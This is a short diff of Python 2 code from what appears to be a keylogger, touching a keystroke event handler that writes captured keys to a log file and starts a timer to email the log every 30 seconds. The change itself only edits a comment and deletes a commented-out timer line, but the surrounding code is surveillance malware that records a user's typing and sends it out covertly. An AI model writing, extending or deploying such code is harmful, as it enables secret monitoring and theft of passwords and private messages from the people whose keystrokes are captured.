@@ -45,14 +45,12 @@ def OnKeyStrokeEvent(event):
         try:
             threading.Timer(30, schedule_email).start()      # Call a thread here to send shecdule mail at every 30 second
             threading._sleep(15)
-            #After Initiate first threading , threading sleep 10 seconds
+            #After Initiate first threading , threading sleep 15 seconds
         except Exception as e:
             print "Error : -"+ e.__str__()
 
 
 
-    # else:
-    #   threading.Timer(60, schedule_email).start()
     logfile.write(write_keystroke)
 
     # 96 is the ascii value of the grave key (`), we should use any value that is generally press by a ordinary user
